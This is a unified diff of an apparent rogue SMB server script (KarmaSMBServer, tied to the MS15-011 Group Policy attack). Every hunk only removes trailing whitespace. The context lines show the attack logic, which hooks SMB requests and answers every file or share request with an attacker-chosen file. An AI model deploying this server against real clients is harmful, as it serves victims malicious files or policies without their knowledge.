@@ -139,8 +139,8 @@ class KarmaSMBServer(Thread):
         self.origsmb2Read = self.server.hookSmb2Command(smb2.SMB2_READ, self.smb2Read)
         self.origsmb2Close = self.server.hookSmb2Command(smb2.SMB2_CLOSE, self.smb2Close)
 
-        # Now we have to register the MS-SRVS server. This specially important for 
-        # Windows 7+ and Mavericks clients since they WON'T (specially OSX) 
+        # Now we have to register the MS-SRVS server. This specially important for
+        # Windows 7+ and Mavericks clients since they WON'T (specially OSX)
         # ask for shares using MS-RAP.
 
         self.__srvsServer = SRVSServer()
@@ -171,9 +171,9 @@ class KarmaSMBServer(Thread):
             path = connData['ConnectedShares'][recvPacket['Tid']]['path']
 
             # 2. We call the normal findFirst2 call, but with our targetFile
-            searchResult, searchCount, errorCode = findFirst2(path, 
-                          targetFile, 
-                          findFirst2Parameters['InformationLevel'], 
+            searchResult, searchCount, errorCode = findFirst2(path,
+                          targetFile,
+                          findFirst2Parameters['InformationLevel'],
                           findFirst2Parameters['SearchAttributes'], pktFlags = recvPacket['Flags2'] )
 
             respParameters = smb.SMBFindFirst2Response_Parameters()
@@ -207,13 +207,13 @@ class KarmaSMBServer(Thread):
                     searchCount +=1
                     respData += data
                     totalData += lenData
-                    
+
 
             respParameters['SID'] = sid
             respParameters['EndOfSearch'] = endOfSearch
             respParameters['SearchCount'] = searchCount
         else:
-            errorCode = STATUS_SMB_BAD_TID   
+            errorCode = STATUS_SMB_BAD_TID
 
         smbServer.setConnectionData(connId, connData)
 
@@ -263,7 +263,7 @@ class KarmaSMBServer(Thread):
             targetFile = self.extensions[origPathNameExtension.upper()]
         else:
             targetFile = self.defaultFile
-        
+
         # 2. We change the filename in the request for our targetFile
         ntCreateAndXData['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = targetFile)
         SMBCommand['Data'] = ntCreateAndXData.getData()
@@ -276,7 +276,7 @@ class KarmaSMBServer(Thread):
         # The trick we play here is that Windows clients first ask for the file
         # and then it asks for the directory containing the file.
         # It is important to answer the right questions for the attack to work
-        
+
         connData = smbServer.getConnectionData(connId)
 
         respSetup = b''
@@ -313,7 +313,7 @@ class KarmaSMBServer(Thread):
                 respData = infoRecord
         else:
             errorCode = STATUS_SMB_BAD_TID
-           
+
         smbServer.setConnectionData(connId, connData)
 
         return respSetup, respParameters, respData, errorCode
@@ -323,7 +323,7 @@ class KarmaSMBServer(Thread):
         connData['MS15011']['StopConnection'] = True
         smbServer.setConnectionData(connId, connData)
         return self.origsmb2Read(connId, smbServer, recvPacket)
- 
+
     def smb2Close(self, connId, smbServer, recvPacket):
         connData = smbServer.getConnectionData(connId)
         # We're closing the connection trying to flush the client's
@@ -339,7 +339,7 @@ class KarmaSMBServer(Thread):
 
         # Let's try to avoid allowing write requests from the client back to us
         # not 100% bulletproof, plus also the client might be using other SMB
-        # calls 
+        # calls
         createOptions =  ntCreateRequest['CreateOptions']
         if createOptions & smb2.FILE_DELETE_ON_CLOSE == smb2.FILE_DELETE_ON_CLOSE:
             errorCode = STATUS_ACCESS_DENIED
@@ -377,7 +377,7 @@ class KarmaSMBServer(Thread):
             smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)
         else:
             targetFile = '/'
-        
+
         # 2. We change the filename in the request for our targetFile
         try:
             ntCreateRequest['Buffer'] = targetFile.encode('utf-16le')
@@ -407,10 +407,10 @@ class KarmaSMBServer(Thread):
         #    return [smb2.SMB2Error()], None, STATUS_NOT_SUPPORTED
 
         if connData['MS15011']['FindDone'] is True:
-            
+
             connData['MS15011']['FindDone'] = False
             smbServer.setConnectionData(connId, connData)
-            return [smb2.SMB2Error()], None, STATUS_NO_MORE_FILES 
+            return [smb2.SMB2Error()], None, STATUS_NO_MORE_FILES
         else:
             origName, targetFile =  connData['MS15011']['FileData']
             (mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime) = os.stat(targetFile)
@@ -469,7 +469,7 @@ class KarmaSMBServer(Thread):
             path = ntpath.basename(UNCOrShare)
 
         # We won't search for the share.. all of them exist :P
-        #share = searchShare(connId, path.upper(), smbServer) 
+        #share = searchShare(connId, path.upper(), smbServer)
         connData['MS15011'] = {}
         connData['MS15011']['FindDone'] = False
         connData['MS15011']['StopConnection'] = False
@@ -544,7 +544,7 @@ class KarmaSMBServer(Thread):
 
         # We won't search for the share.. all of them exist :P
         smbServer.log("TreeConnectAndX request for %s" % path, logging.INFO)
-        #share = searchShare(connId, path, smbServer) 
+        #share = searchShare(connId, path, smbServer)
         share = {}
         # Simple way to generate a Tid
         if len(connData['ConnectedShares']) == 0:
@@ -567,7 +567,7 @@ class KarmaSMBServer(Thread):
         respData['NativeFileSystem']      = encodeSMBString(recvPacket['Flags2'], 'NTFS' ).decode()
 
         respSMBCommand['Parameters']             = respParameters
-        respSMBCommand['Data']                   = respData 
+        respSMBCommand['Data']                   = respData
 
         resp['Uid'] = connData['Uid']
         resp.addCommand(respSMBCommand)
@@ -623,7 +623,7 @@ if __name__ == '__main__':
         s.setExtensionsConfig(options.config)
 
     s.start()
-        
+
     logging.info("Servers started, waiting for connections")
     while True:
         try:
